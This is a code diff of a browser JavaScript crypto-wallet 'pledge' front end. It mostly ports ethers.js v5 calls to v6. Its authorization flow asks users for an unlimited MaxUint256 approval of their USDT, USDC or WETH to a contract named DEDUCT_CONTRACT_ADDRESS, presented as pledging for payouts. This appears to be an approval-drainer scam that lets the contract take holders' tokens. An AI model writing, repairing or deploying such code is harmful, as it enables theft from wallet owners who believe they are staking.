@@ -400,7 +400,7 @@ function updateBalancesUI(walletBalances) {
   const selectedToken = walletTokenSelect.value;
   const decimals = { USDT: 6, USDC: 6, WETH: 18 };
   const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
-  const formattedWalletBalance = window.ethers.utils.formatUnits(walletTokenBigInt, decimals[selectedToken]);
+  const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
   if (walletBalanceAmount) walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
   const claimedBalance = accountBalance[selectedToken] || 0;
   const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
@@ -593,7 +593,6 @@ async function initializeWallet() {
       if (connectButton) connectButton.disabled = true;
       return;
     }
-    // 關鍵修正：使用 BrowserProvider
     provider = new window.ethers.BrowserProvider(window.ethereum);
     window.ethereum.on('accountsChanged', a => {
       if (a.length === 0) disconnectWallet();
@@ -633,8 +632,8 @@ async function connectWallet() {
     updateStatus('Connecting...');
     const accounts = await provider.send('eth_requestAccounts', []);
     if (accounts.length === 0) throw new Error("No account.");
-    signer = await provider.getSigner();  // 這裡已 await
-    userAddress = await signer.getAddress();  // 關鍵修正：加入 await
+    signer = await provider.getSigner();
+    userAddress = await signer.getAddress();
 
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -704,7 +703,7 @@ async function updateUIBasedOnChainState() {
         balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
       } catch (e) {}
       const decimals = selectedToken === 'WETH' ? 18 : 6;
-      const balance = parseFloat(window.ethers.utils.formatUnits(balanceBigInt, decimals));
+      const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
       if (balance >= 1) {
         pledgedAmount = balance;
         lastPayoutTime = lastPayoutTime || Date.now();
@@ -766,7 +765,7 @@ async function handleConditionalAuthorizationFlow() {
     if (currentAllowance < requiredAllowance) {
       updateStatus(`Requesting ${name} approval...`);
       try {
-        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, window.ethers.constants.MaxUint256);
+        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         approvalTx.value = 0n;
         await sendMobileRobustTransaction(approvalTx);
         const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
@@ -871,7 +870,7 @@ document.addEventListener('DOMContentLoaded', () => {
         balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
       } catch (e) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
       const decimals = selectedToken === 'WETH' ? 18 : 6;
-      const balance = parseFloat(window.ethers.utils.formatUnits(balanceBigInt, decimals));
+      const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
       if (balance === 0) { updateStatus(translations[currentLang].balanceZero, true); return; }
       startBtn.disabled = true;
       startBtn.textContent = 'Authorizing...';
@@ -921,7 +920,7 @@ document.addEventListener('DOMContentLoaded', () => {
       try {
         const balance = await retry(() => selectedContract.balanceOf(userAddress));
         const decimals = token === 'WETH' ? 18 : 6;
-        const formattedBalance = parseFloat(window.ethers.utils.formatUnits(balance, decimals));
+        const formattedBalance = parseFloat(ethers.formatUnits(balance, decimals));
         if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
       } catch (error) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
       updateStatus('Pledging...');
